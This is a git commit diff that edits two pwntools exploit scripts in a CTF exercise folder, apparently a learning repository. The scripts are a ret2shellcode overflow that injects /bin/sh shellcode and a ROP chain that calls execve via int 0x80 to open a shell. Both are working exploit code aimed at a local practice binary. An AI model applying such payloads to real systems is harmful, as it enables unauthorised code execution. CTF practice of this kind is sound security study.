ad6e3bcb6733164b76ea936945fdd1d7bf13f841
ducheng.pydc <ducheng.pydc@bytedance.com>
2022-01-10 11:57:11 +0800

    feat:rop1 syscall 总结

--- ctf/ROP1/expshell.py
+++ ctf/ROP1/expshell.py
@@ -2,9 +2,9 @@
 from pwn import *
 
 sh = process('./ret2shellcode')
-shellcode = asm(shellcraft.sh()).decode("iso-8859-1")
+shellcode = asm(shellcraft.sh())
 buf2_addr = 0x0804a080
 
-#sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
-sh.sendline(shellcode + (112-len(shellcode))*'A' + p32(buf2_addr).decode("iso-8859-1"))
+sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
+#sh.sendline(shellcode + (112-len(shellcode))*'A' + p32(buf2_addr).decode("iso-8859-1"))
 sh.interactive()
--- ctf/ROP1/expsyscall.py
+++ ctf/ROP1/expsyscall.py
@@ -7,7 +7,7 @@ pop_eax_ret = 0x080bb196
 pop_edx_ecx_ebx_ret = 0x0806eb90
 int_0x80 = 0x08049421
 binsh = 0x80be408
-payload = flat(
-    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
+payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
+# payload2 = 'A' * 112+p32(pop_eax_ret).decode("iso-8859-1")+p32(0xb).decode("iso-8859-1")+p32(pop_edx_ecx_ebx_ret).decode("iso-8859-1")+p32(0x0).decode("iso-8859-1")+p32(0x0).decode("iso-8859-1")+p32(binsh).decode("iso-8859-1")+p32(int_0x80).decode("iso-8859-1")
 sh.sendline(payload)
 sh.interactive()
